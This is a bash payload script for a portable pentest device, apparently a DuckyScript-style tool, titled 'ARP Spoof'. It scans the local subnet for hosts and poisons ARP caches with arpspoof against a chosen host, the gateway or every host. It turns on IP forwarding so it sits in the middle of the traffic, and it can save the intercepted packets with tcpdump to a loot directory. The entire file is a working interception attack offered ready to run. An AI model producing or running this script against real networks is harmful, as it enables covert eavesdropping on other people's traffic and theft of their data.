#!/bin/bash
# Title: ARP Spoof
# Author: NullSec
# Description: ARP poisoning for MITM attacks with target selection
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/arpspoof"
mkdir -p "$LOOT_DIR"

PROMPT "ARP SPOOF

ARP cache poisoning for
man-in-the-middle attacks.

Redirects target traffic
through this device for
interception.

WARNING: Active attack.
Will be visible on network.

Press OK to configure."

# Find interface
IFACE=""
for i in br-lan eth0 wlan1 wlan0; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "No interface found!"; exit 1; }

LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
SUBNET=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}')

[ -z "$GATEWAY" ] && { ERROR_DIALOG "No gateway detected!"; exit 1; }

PROMPT "NETWORK INFO:

Interface: $IFACE
Local IP: $LOCAL_IP
Gateway: $GATEWAY
Subnet: $SUBNET

Press OK to scan for
targets on the network."

SPINNER_START "Scanning for targets..."

SCAN_FILE="/tmp/arp_scan_$$.txt"
# ARP scan the local subnet
if command -v arp-scan >/dev/null 2>&1; then
    arp-scan --interface="$IFACE" --localnet 2>/dev/null | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" > "$SCAN_FILE"
else
    # Fallback: ping sweep + arp table
    NETWORK=$(echo "$SUBNET" | cut -d'/' -f1 | sed 's/\.[0-9]*$/./')
    for i in $(seq 1 254); do
        ping -c 1 -W 1 "${NETWORK}${i}" >/dev/null 2>&1 &
    done
    wait
    arp -an | grep -v incomplete | grep "$IFACE" > "$SCAN_FILE"
fi

SPINNER_STOP

TARGET_COUNT=$(wc -l < "$SCAN_FILE" | tr -d ' ')
TARGET_LIST=$(head -10 "$SCAN_FILE" | awk '{print NR". "$1}')

PROMPT "TARGETS FOUND: $TARGET_COUNT

$TARGET_LIST

Press OK to select
target mode."

PROMPT "TARGET MODE:

1. Single target
2. Entire subnet
3. Gateway only

Select mode next."

TARGET_MODE=$(NUMBER_PICKER "Mode (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_MODE=1 ;; esac

TARGET_IP="$GATEWAY"
case $TARGET_MODE in
    1)
        TARGET_IP=$(TEXT_PICKER "Target IP:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
        ;;
    2)
        TARGET_IP=""  # All hosts
        ;;
    3)
        TARGET_IP="$GATEWAY"
        ;;
esac

CAPTURE=$(CONFIRMATION_DIALOG "Capture traffic?

Also run tcpdump to
capture intercepted
packets?")

DURATION=$(NUMBER_PICKER "Duration (minutes):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac

resp=$(CONFIRMATION_DIALOG "START ARP SPOOF?

Target: ${TARGET_IP:-ALL HOSTS}
Gateway: $GATEWAY
Duration: ${DURATION}m
Capture: $([ \"$CAPTURE\" = \"$DUCKYSCRIPT_USER_CONFIRMED\" ] && echo YES || echo NO)

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
LOG "Starting ARP spoof..."
SPINNER_START "Poisoning ARP cache..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start traffic capture if requested
if [ "$CAPTURE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    PCAP="$LOOT_DIR/arpspoof_$TIMESTAMP.pcap"
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -w "$PCAP" -s 0 not arp 2>/dev/null &
    CAP_PID=$!
fi

# ARP spoofing
if [ -n "$TARGET_IP" ]; then
    # Spoof target <-> gateway
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null &
    SPOOF_PID1=$!
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null &
    SPOOF_PID2=$!
else
    # Spoof entire subnet
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" "$GATEWAY" 2>/dev/null &
    SPOOF_PID1=$!
    SPOOF_PID2=""
fi

SPINNER_STOP

PROMPT "ARP SPOOF ACTIVE!

Target: ${TARGET_IP:-ALL}
Gateway: $GATEWAY

Traffic is being
redirected through
this device.

Press OK when done
or wait ${DURATION}m."

wait $SPOOF_PID1 2>/dev/null
[ -n "$SPOOF_PID2" ] && wait $SPOOF_PID2 2>/dev/null
[ -n "$CAP_PID" ] && { kill $CAP_PID 2>/dev/null; wait $CAP_PID 2>/dev/null; }

# Disable forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

PCAP_SIZE=""
[ -f "$PCAP" ] && PCAP_SIZE=$(du -h "$PCAP" | awk '{print $1}')

rm -f "$SCAN_FILE"

PROMPT "ARP SPOOF STOPPED

Duration: ${DURATION}m
Target: ${TARGET_IP:-ALL}
$([ -n "$PCAP_SIZE" ] && echo "Capture: $PCAP_SIZE" || echo "No capture")

Forwarding disabled.
ARP tables will recover.

Press OK to exit."
